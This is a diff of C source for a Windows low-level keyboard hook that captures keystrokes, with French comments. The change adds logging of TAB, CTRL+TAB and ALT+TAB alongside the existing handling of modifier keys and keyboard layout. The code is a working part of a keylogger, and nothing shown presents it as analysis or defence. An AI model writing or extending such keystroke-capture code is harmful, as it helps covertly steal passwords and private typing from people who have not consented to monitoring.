@@ -73,12 +73,26 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
     // log sur KEYDOWN pour les touches imprimables et sur KEYUP pour les modifiers
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-        DWORD vkCode = pKeyboard->vkCode;
+		DWORD vkCode = pKeyboard->vkCode;
 
-        if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
-            ctrl_is_down = 1;
-            return CallNextHookEx(NULL, nCode, wParam, lParam);
-        }
+		if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+			ctrl_is_down = 1;
+			return CallNextHookEx(NULL, nCode, wParam, lParam);
+		}
+
+		// Gestion de TAB avec CTRL ou ALT
+		if (vkCode == VK_TAB) {
+			if (ctrl_is_down || (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
+				suppress_ctrl_up = 1;
+				LogKey(" [CTRL+TAB] ");
+				return CallNextHookEx(NULL, nCode, wParam, lParam);
+			} else if (GetAsyncKeyState(VK_MENU) & 0x8000) {
+				LogKey(" [ALT+TAB] ");
+				return CallNextHookEx(NULL, nCode, wParam, lParam);
+			} else {
+				LogKey(" [TAB] ");
+			}
+		}
 
         // gestion de la locale et état des touches (AZERTY, majuscules...)
         BYTE keyboardState[256] = {0};
